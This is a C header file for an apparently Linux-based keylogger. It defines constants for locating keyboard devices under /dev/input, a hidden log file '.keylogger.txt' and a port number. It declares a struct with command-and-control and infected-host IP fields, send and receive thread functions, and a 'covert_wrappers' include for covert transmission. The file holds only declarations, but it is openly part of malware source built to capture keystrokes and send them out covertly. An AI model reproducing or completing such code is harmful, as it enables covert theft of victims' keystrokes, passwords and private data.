/*
 * =====================================================================================
 *
 *       Filename:  keylogger.h
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  11/13/2018 08:02:15 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  YOUR NAME (), 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <stdio.h>
#include <unistd.h>             //for sleep
//#include "covert_wrappers.h"    //for covert sending
#include <stdlib.h>
#include <dirent.h>             //filtering through all device files
#include <sys/stat.h>           //filtering through all device files
#include <linux/input.h>        //finding keyboard devices
#include <sys/types.h>          //io
#include <fcntl.h>
#include <string.h>             //strdup
#include <signal.h>
#include "covert_wrappers.h"

#define INPUT_DIR "/dev/input/"
#define NUM_EVENTS 128
#define NUM_KEYCODES 71
#define KEYLOGGER_PORT 8600
#define KEYLOGGER_FILENAME ".keylogger.txt"

typedef struct {
    char cnc_ip[BUFSIZ];
    char infected_ip[BUFSIZ];
} keylogger_struct;

void *keylogger_send(void* args);
void *keylogger_recv(void* args);
char *get_keyboard_event_file ();
void sigint_handler(int sig);

